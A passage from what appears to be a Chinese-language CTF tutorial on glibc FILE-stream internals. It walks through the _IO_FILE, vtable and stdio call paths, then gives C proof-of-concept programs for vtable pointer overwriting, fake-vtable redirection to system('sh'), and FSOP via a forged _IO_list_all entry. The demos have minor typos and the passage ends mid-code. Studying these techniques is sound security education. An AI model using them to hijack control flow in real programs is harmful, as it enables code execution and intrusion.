class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br><br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>进程中的FILE被_chain域彼此连接形成链表，头部为<code>IO_list_all</code>表示，通过其我们可以遍历进程中所有FILE结构</p></li><li><p>初始状态：stdin、stdout、stderr文件流自动打开，所以初始时<code>IO_list_all</code>指向由这些文件构成的链表，需要注意的是这三个文件流位于libc.so的数据段</p></li><li><p>libc.so数据段上的符号指向FILE结构的指针，真正结构符号：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_2_1_stderr_<br>_IO_2_1_stdout_<br>_IO_2_1_stdin_<br></code></pre></td></tr></table></figure><ul><li>_IO_FILE_PLUS<ul><li>包裹着_IO_FILE的结构，还有指针vtable</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.23下32位vtable偏移0x94，64位0xd8（相对结构体起始）</p><ul><li>vtable类型为IO_jimp_t，IO_jump_t 保存的是一些函数的指针，在后面一系列IO函数中会调用这些指针</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * funcs[] = &#123;<br>   <span class="hljs-number">1</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// &quot;extra word&quot;</span><br>   <span class="hljs-number">2</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// DUMMY</span><br>   <span class="hljs-number">3</span> <span class="hljs-built_in">exit</span>, <span class="hljs-comment">// finish</span><br>   <span class="hljs-number">4</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// overflow</span><br>   <span class="hljs-number">5</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// underflow</span><br>   <span class="hljs-number">6</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// uflow</span><br>   <span class="hljs-number">7</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// pbackfail</span><br>   <br>   <span class="hljs-number">8</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsputn  #printf</span><br>   <span class="hljs-number">9</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsgetn</span><br>   <span class="hljs-number">10</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekoff</span><br>   <span class="hljs-number">11</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekpos</span><br>   <span class="hljs-number">12</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// setbuf</span><br>   <span class="hljs-number">13</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// sync</span><br>   <span class="hljs-number">14</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// doallocate</span><br>   <span class="hljs-number">15</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// read</span><br>   <span class="hljs-number">16</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// write</span><br>   <span class="hljs-number">17</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seek</span><br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-comment">// close</span><br>   <span class="hljs-number">19</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// stat</span><br>   <span class="hljs-number">20</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// showmanyc</span><br>   <span class="hljs-number">21</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// imbue</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>尽管每个 <code>FILE</code> 结构的地址不同，但它们共享同一个 vtable。vtable 是一个全局的函数指针数组，所有 <code>FILE</code> 结构的 vtable 指针都指向同一个全局 vtable。 </p><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>作用：从文件流中读数据</p><p>原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">`<span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span> <span class="hljs-params">( <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *stream)</span>;<br></code></pre></td></tr></table></figure><ul><li>buffer：存放读取数据的缓冲区</li><li>size：指定长度</li><li>count：指定个数</li><li>stream：目标文件流</li><li>返回值：返回读取到缓冲区中的记录个数</li></ul><p>fread：位于&#x2F;libio&#x2F;iofread.c中，函数名为_IO_fread</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_fread (buf, size, count, fp)<br>     <span class="hljs-type">void</span> *buf;<br>     _IO_size_t size;<br>     _IO_size_t count;<br>     _IO_FILE *fp;<br>&#123;<br>  ...<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>真正的实现在第9行，通过调用_IO_segtn子函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-type">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>而在这个子函数里又会调用_IO_XSGETN，这是_IO_FILE_plus.vatble中的函数指针，在调用这个函数时会先取出vtable中的指针再进行调用</p><p>默认情况下函数指针是指向 _IO_file_xsgetn函数的，用于处理普通文件的读取操作</p><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>用于向文件流写入数据，原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">fwrite</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* buffer, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE* stream)</span>;<br></code></pre></td></tr></table></figure><ul><li>buffer：写入地址</li><li>size：写入内容单字节数</li><li>count：写入size数据的个数</li><li>stream：目标文件指针</li><li>返回值：实际写入个数</li></ul><p>fwrite 代码函数名为 _IO_fwrite，通过调用 _IO_XSPUTN 实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_IO_fwrite中</span><br>    written = _IO_sputn (fp, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) buf, <br></code></pre></td></tr></table></figure><p>该指针其位于 vtable 中，首先要取出其指针再跳去调用</p><p>_IO_XSPUTN 的默认实现为 _IO_new_file_xsputn </p><p>而 _IO_new_file_xsputn 会调用 _IO_OVERFLOW 来处理缓冲区溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Next flush the (full) buffer. */</span><br>     <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>而 _IO_OVERFLOW 的默认实现  _IO_new_file_overflow </p><p>然后  _IO_new_file_overflow 会调用 _IO_do_write 和 _IO_do_flush 来刷新缓冲区 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br></code></pre></td></tr></table></figure><p>然后 _IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>用于打开文件</p><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename, *type)</span>;<br></code></pre></td></tr></table></figure><ul><li>filename：目标文件路径</li><li>type：打开方式</li><li>返回值：返回一个文件指针</li></ul><p>fopen 对应函数  __fopen_internal 内部调用 malloc 来分配 FILE 的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br></code></pre></td></tr></table></figure><p>初始化 vtable 并且调用 _IO_file_init 进一步初始化操作 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>_IO_file_init (&amp;new_f-&gt;fp);<br></code></pre></td></tr></table></figure><p> _IO_file_init 中，调用 _IO_link_in 把新分配的 FILE 结构链入链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_link_in (fp)<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> *<span class="hljs-title">fp</span>;</span><br>&#123;<br>    <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br>      ++_IO_list_all_stamp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后 __fopen_internal 函数会调用 _IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数</p><p>总结调用 fopen 时</p><ul><li>malloc 分配 FILE 结构到堆区</li><li>初始化 vtable 和FILE</li><li>链入链表</li><li>调用系统结构打开文件</li></ul><p>这个没有调用 vtable 中的</p><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>顾名思义，关闭文件</p><p>原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">(FILE *stream)</span><br></code></pre></td></tr></table></figure><ul><li>stream：目标文件流指针</li></ul><p>功能：关闭文件流，把缓冲区剩余数据输出到磁盘文件中，释放文件指针和缓冲区</p><p>首先调用 _IO_unlink_it 将指定的 FILE 从 _chain 链表中脱链 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br></code></pre></td></tr></table></figure><p>之后调用 <code>\_IO_file_close_it </code>调用系统接口 <code>close </code>关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);<br></code></pre></td></tr></table></figure><p>最后调用 vtable 中 <strong>_IO_FINNSH</strong>，其对应 <code>_IO_file_finish </code>函数会调用 free 释放掉之前分配的 FILE 结构</p><h2 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf&#x2F;puts"></a>printf&#x2F;puts</h2><p><code>printf </code>和 <code>puts </code>是常用的输出函数，在 <code>printf </code>的参数是以<code>&#39;\n&#39;</code>结束的纯字符串时，<code>printf </code>会被优化为 <code>puts </code>函数并去除换行符（用于提高性能，puts 函数更简单）</p><p>puts 在源码中实现的函数是 <code>_IO_puts</code>，这个函数的操作与 <code>fwrite</code> 的流程大致相同，函数内部同样会调用 vtable 中的 <strong>_IO_sputn</strong>，结果会执行<code>_IO_new_file_xsputn</code>，最后会调用到系统接口 <code>write </code>函数。</p><p>printf 的调用栈回溯如下，同样是通过<code>_IO_file_xsputn </code>实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">vfprintf</span>+<span class="hljs-number">11</span><br>_IO_file_xsputn<br>_IO_file_overflow<br>funlockfile<br>_IO_file_write<br>write<br></code></pre></td></tr></table></figure><h1 id="伪造-vtable-来劫持程序流"><a href="#伪造-vtable-来劫持程序流" class="headerlink" title="伪造 vtable 来劫持程序流"></a>伪造 vtable 来劫持程序流</h1><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><ul><li>直接改写<code>vtable</code>中函数指针</li><li>覆盖<code>vtable</code>指针到我们控制的内存中，在其中布置函数指针</li></ul><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="修改-vtable-中指针"><a href="#修改-vtable-中指针" class="headerlink" title="修改 vtable 中指针"></a>修改 vtable 中指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    vtable_ptr[<span class="hljs-number">7</span>]=<span class="hljs-number">0x41414141</span> <span class="hljs-comment">//xsputn</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call 0x41414141&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以看到第8行修改<code>vtable</code>中第八项为 0x41414141 也就是 <code>xsputn </code>为 0x41414141 这是 printf 调用时会调用的 <code>vtable </code>中的指针，所以之后调用 printf 就会 call 0x41414141</li></ul><h3 id="修改vtable指针到可控内存上"><a href="#修改vtable指针到可控内存上" class="headerlink" title="修改vtable指针到可控内存上"></a>修改vtable指针到可控内存上</h3><p>在 vtable 函数进行调用时，传入的第一个参数是其对应 <code>_IO_FILE_plus </code>地址 </p><p>我们可以通过修改地址上的内容来实现给劫持的 <code>vtable </code>函数传参</p><p>实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_ptr;<br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    vtable_ptr=*(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//get vtable</span><br><br>    memcopy(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    vtable_ptr[<span class="hljs-number">7</span>]=system_ptr <span class="hljs-comment">//xsputn</span><br><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>第 10 行我们将 sh 写入了 fp 指向的地方，也就是 <code>_IO_FILE_plus </code>地址，配合我们后面劫持指针为 <code>system </code>地址，最后 <code>fwrite</code>就会执行<code>system(&quot;sh&quot;)</code></li></ul><p>在2.23版本中位于libc数据段的<code>vtable</code>是不可写入的，但伪造<code>vtable</code>指针到我们自己创建的内存当中的方式还是可以实现的（也就是第二种方式）</p><p>实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> system_ptr 0x7ffff7a52390;</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *vtable_addr,*fake_vtable;<br><br>    fp=fopen(<span class="hljs-string">&quot;123.txt&quot;</span>,<span class="hljs-string">&quot;rw&quot;</span>);<br>    fake_vtable=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br><br>    vtable_addr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fp+<span class="hljs-number">0xd8</span>);     <span class="hljs-comment">//vtable offset</span><br><br>    vtable_addr[<span class="hljs-number">0</span>]=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fake_vtable;<br><br>    <span class="hljs-built_in">memcpy</span>(fp,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-number">3</span>);<br><br>    fake_vtable[<span class="hljs-number">7</span>]=system_ptr; <span class="hljs-comment">//xsputn</span><br><br>    fwrite(<span class="hljs-string">&quot;hi&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,fp);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>第9行是我们自己分配的大块内存用于伪造 <code>vtable</code>，13行就是修改 <code>vtable </code>到我们伪造的上面，15行将 sh 写到 fp上，也就是 <code>_IO_FILE_plus</code> 地址，17行修改 <code>fwrite </code>要调用的 <code>vtable </code>中的那个函数，这样最后执行 <code>fwrite </code>就是<code>system(&quot;sh&quot;)</code></li></ul><h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>FSOP：File Stream Oriented Rrogramming（文件流导向编程），通过前面可知进程内所有 <code>_IO_FILE </code>结构会使用 <code>_chain </code>来链成一个单向链表，头部是 <code>_IO_list_all</code></p><ul><li><p>方式：</p><ul><li>通过伪造这个单向链表中的 <code>_IO_FILE_plue </code>结构体，将其 vtable 指针指向我们伪造的 vtable 表</li><li>接着将这个<code>vtable</code>中关键函数替换为恶意函数地址</li><li>触发方法是调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all </code>链表中所有项的文件流，相当于对每个 <code>FILE </code>调用 <code>fflush</code>，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>。 </li><li>触发 <code>_IO_flush_all_lockp</code>遍历 <code>_IO_list_all</code>链表<ul><li>访问伪造的 <code>FILE</code> 结构体 → 读取其 <code>vtable</code> 指针 → 定位到伪造的 <code>vtable</code> 表。从<code>vtable</code>取出恶意函数的指针，从而执行恶意代码</li></ul></li></ul></li><li><p><code>_IO_flush_all_lockp </code>的调用情况</p></li><li><p>当<code>libc</code>执行<code>abort</code>流程时（一种程序发生严重错误会执行的流程）</p></li><li><p>当执行<code>exit</code>函数时</p></li><li><p>当执行流从<code>main</code>函数返回时</p></li><li><p>为了使fake_file能够正常工作，我们需要布置一些其他的数据来通过检查</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<br>               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>           &#123;<br>               result = EOF;<br>          &#125;<br></code></pre></td></tr></table></figure><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><h2 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<span class="hljs-comment">//分配0x200，前0x100伪造FILE，后0x100伪造vtable</span><br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<span class="hljs-comment">//伪造一些必要的数据</span><br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<span class="hljs-comment">//将_IO_overflow改成0x41414141，24是在vtable表中的偏移</span><br><br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br><br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br><br>    <span 